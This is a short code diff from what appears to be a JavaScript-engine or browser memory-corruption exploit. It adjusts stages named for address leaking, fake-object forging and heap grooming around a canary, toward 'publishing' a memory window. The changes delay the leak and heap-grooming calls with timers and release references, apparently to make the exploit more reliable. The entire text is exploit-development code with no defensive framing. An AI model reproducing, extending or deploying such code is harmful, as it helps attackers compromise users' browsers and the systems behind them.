@@ -198,13 +198,14 @@ function startAttempt() {
     storeHistoryGraph();
     for (let i = 0; i < 8; ++i)
       memoryView[CANARY_OFFSET + i] = identityMagic[i];
-    prepareAddressLeak();
   } catch (error) {
     finishEarlySafeAttempt(
       "setup failed",
       `${error?.name}: ${String(error?.message).slice(0, 80)}`,
     );
+    return;
   }
+  setTimeout(prepareAddressLeak, 200);
 }
 
 // Address-leak helper
@@ -644,7 +645,10 @@ function finishAddressLeak() {
   if (!plausibleCell(fakeAddress))
     return finishEarlySafeAttempt("Invalid fake object address", hex(hostAddress));
   capturedString = null;
-  groomHeap(fakeAddress, holderAddress);
+  getterCarrier = null;
+  preparedSymbolObject = null;
+  capturedWords = null;
+  setTimeout(() => groomHeap(fakeAddress, holderAddress), 300);
 }
 
 // Stage 5: retry placement misses or publish the validated memory window.
